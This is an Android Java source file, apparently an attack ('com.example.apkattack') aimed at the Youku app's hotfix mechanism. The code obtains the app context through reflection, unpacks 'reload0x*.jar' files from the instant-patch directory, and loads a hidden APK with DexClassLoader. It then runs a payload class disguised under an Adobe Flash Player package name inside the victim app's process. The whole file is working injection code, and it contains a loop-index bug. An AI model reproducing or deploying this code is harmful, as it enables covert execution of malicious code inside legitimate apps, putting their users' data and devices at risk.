package com.example.apkattack;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Method;
import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import android.annotation.SuppressLint;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class YoukuHotfix {

	@SuppressLint("SdCardPath") 
	public static void youkuPhoneEntryWithouContext(){
    	String Tag = "YoukuHotfixEntry";
    	try {
    		
    		Log.e(Tag,"start");
    		
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
    		

    		String apppath = context.getFilesDir().getParent() + "/";
    		//String apppath = "/data/data/com.youku.phone/";
	    	String unzippath = apppath + "youkuEntry/";

	    	String dexmethodname = "start";
	    	//String cfgfn = "ark.dat";
	    	
	    	String apkfn = "";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";

	    	//String apkfn = "qqsdl.apk";
	    	//String dexclassname = "com.google.android.apps.plus.JarEntry";
	    	
			File unzippathfFile = new File(unzippath);
			if (unzippathfFile.exists() == false) {
				boolean ret = unzippathfFile.mkdirs();
				if (ret == false) {
					Log.e(Tag,"error create unzip folder:" + unzippath);
					return;
				}else{
					Log.e(Tag,"successully unzip make path:" + unzippath);
				}
			}else{
				Log.e(Tag,"already exist unzip path:" + unzippath);
			}
			
	    	
			File []unzipfiles = new File(unzippath + "assets/").listFiles();
			if (unzipfiles == null || unzipfiles.length == 0) {

				String pluginapkpath = apppath + "files/instant-patch/dex-temp/";
				
				boolean flag = false;
				
				File [] files = new File(pluginapkpath).listFiles();
				for (int i = 0; i < files.length; i++) {
					
					if (flag == true) {
						break;
					}
					
					String tmpfilename = files[i].getName();
					if (tmpfilename.startsWith("reload0x") && tmpfilename.endsWith(".jar")) {
						
						String tmpfn = pluginapkpath + tmpfilename; 

				        ZipEntry zipEntry = null;
				        byte unzipbuf[] = new byte[0x10000];
				        ZipInputStream zipIn = new ZipInputStream(new BufferedInputStream(new FileInputStream(tmpfn)));

			            while ( (zipEntry = zipIn.getNextEntry()) != null) {
			            	File unzipfile = new File(unzippath + zipEntry.getName());
			                if (zipEntry.isDirectory()) {
			                	unzipfile.mkdirs();
			                	Log.e(Tag,"unzip make folder:" + zipEntry.getName());
			                } else {
			                    File unzipparent = unzipfile.getParentFile();
			                    if (unzipparent.exists() == false) {
			                    	unzipparent.mkdirs();
			                    	
			                    	Log.e(Tag,"unzip make parent folder:" + unzipparent.getName());
			                    }
			                    
			                	FileOutputStream fileOut = new FileOutputStream(unzipfile);
			                    int readedBytes = 0;
			                    while ((readedBytes = zipIn.read(unzipbuf)) > 0) {
			                        fileOut.write(unzipbuf, 0, readedBytes);
			                    }
			                    fileOut.close();
			                }
			                zipIn.closeEntry();
			            }
			            zipIn.close();
			            
			            unzipfiles = new File(unzippath + "assets/").listFiles();
			            for (int j = 0; j < unzipfiles.length; j++) {
							String tmpunzipfile = unzipfiles[i].getName();
							if (tmpunzipfile.endsWith(".apk")) {
								apkfn = tmpunzipfile;
								flag = true;
								break;
							}
						}
					}
				}
				
				Log.e(Tag,"unzip complete");
			}else{
				Log.e(Tag,"find apk and config file");
			}
			
			unzipfiles = new File(unzippath + "assets/").listFiles();
			for (int i = 0; i < unzipfiles.length; i++) {
				String tmpfn = unzipfiles[i].getName();
				if (tmpfn.endsWith(".apk") && tmpfn.equals("base.apk") == false) {
					apkfn = tmpfn;
					break;
				}
			}
			
			if (apkfn == null || apkfn.equals("")) {
				Log.e(Tag,"not find apk or config file");
				return;
			}

	    	String appcachepath = context.getCacheDir() + "/";

	    	DexClassLoader dexcl = new DexClassLoader(unzippath + "assets/" + apkfn, appcachepath, null,context.getClassLoader());

    		Class<?> cls = dexcl.loadClass(dexclassname);
    	    Object obj = cls.newInstance();

    	    Method method = cls.getDeclaredMethod(dexmethodname, Context.class);
    	    method.invoke(obj,context);
    	    
    	    Log.e(Tag, "youku load apk success");
    	} catch (Exception ex) {
    		ex.printStackTrace();
    		Log.e(Tag, "youku load apk exception");
    	}
	}
}
